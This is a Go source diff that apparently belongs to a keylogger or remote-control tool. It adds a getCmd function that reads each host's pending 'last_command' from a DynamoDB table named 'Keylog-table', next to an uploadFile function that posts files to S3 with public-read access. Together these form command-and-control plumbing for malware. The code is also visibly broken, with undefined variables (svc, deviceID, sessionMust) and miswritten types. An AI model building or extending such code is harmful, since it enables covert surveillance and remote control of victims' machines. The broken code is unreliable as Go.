@@ -10,6 +10,7 @@ import (
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/s3"
+	"github.com/aws/aws-sdk-go/service/dynamodb"
 )
 
 // TO IMPLEMENT:
@@ -126,4 +127,31 @@ func uploadFile(fileName string) error {
 		ACL:    aws.String("public-read"),
 	})
 	return err
+}
+
+func getCmd(hostName string) (string, error) {
+	sess := sessionMust(session.NewSession(&aws.Config{
+		Region: aws.String("ap-southeast-2"),
+	}))
+
+	input := &dynamodb.getItemInput{
+		TableName: aws.String("Keylog-table"),
+		Key: map[String]*dynamodb.AttributeValue{
+			"hostName": {
+				S: aws.String(hostName),
+			},
+		},
+	}
+
+	result, err := svc.GetItem(input)
+	if err != nil {
+		return "", err
+	}
+
+	if result.Item == nil {
+		return "", fmt.Errorf("no command found for device: %s", deviceID)
+	}
+
+	command := result.Item["last_command"].S
+	return *command, nil
 }
